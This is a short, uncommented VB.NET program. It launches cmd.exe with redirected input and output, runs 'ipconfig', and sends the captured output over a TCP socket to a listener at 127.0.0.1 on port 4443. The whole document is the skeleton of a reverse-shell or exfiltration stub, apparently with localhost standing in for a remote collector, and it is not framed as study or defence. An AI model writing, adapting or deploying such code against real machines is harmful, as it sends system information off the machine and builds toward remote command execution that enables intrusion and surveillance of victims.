Imports System.Net, System.IO, System.Diagnostics
Imports System.Net.Sockets
Imports System.Text

Module Program
    Sub Main(args As String())
        Dim ip As New IPEndPoint(IPAddress.Parse("127.0.0.1"), 4443)
        Dim sc As New Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
        Dim buffer(1024) As Byte

        Dim myprocess As New Process
        Dim StartInfo As New ProcessStartInfo

        StartInfo.FileName = "cmd.exe"
        StartInfo.RedirectStandardInput = True
        StartInfo.RedirectStandardOutput = True

        StartInfo.UseShellExecute = False

        StartInfo.CreateNoWindow = False

        myprocess.StartInfo = StartInfo
        myprocess.Start()

        Dim SR As StreamReader = myprocess.StandardOutput
        Dim SW As StreamWriter = myprocess.StandardInput

        SW.WriteLine("ipconfig")
        SW.WriteLine("exit")
        sc.Connect(ip)
        sc.Send(Encoding.UTF8.GetBytes(SR.ReadToEnd()))

        SW.Close()
        SR.Close()

    End Sub
End Module
